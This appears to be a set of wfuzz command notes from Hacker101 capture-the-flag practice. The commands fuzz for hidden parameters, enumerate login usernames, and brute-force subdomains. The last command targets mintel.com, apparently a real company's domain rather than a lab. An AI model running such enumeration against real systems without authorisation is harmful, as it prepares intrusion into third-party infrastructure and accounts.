
```sh
sudo wfuzz --hc=400 -zfile,/usr/share/wordlists/wordlist/fuzz-lfi-params-list.txt https://ef26734dbe646949c019bdd1c731d5b3.ctf.hacker101.com/swag-shop/api/user/?FUZZ=1
```


```sh
wfuzz -zfile,/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames-dup.txt --hs 'Invalid Username' -d 'username=FUZZ&password=blah' https://ef26734dbe646949c019bdd1c731d5b3.ctf.hacker101.com/secure-login
```

```sh
wfuzz -c -f subs_wfuzz.txt -w /var/lib/snapd/snap/seclists/324/Discovery/DNS/subdomains-top1million-110000.txt -u "https://www.mintel.com" -H "Host: FUZZ.mintel.com"
```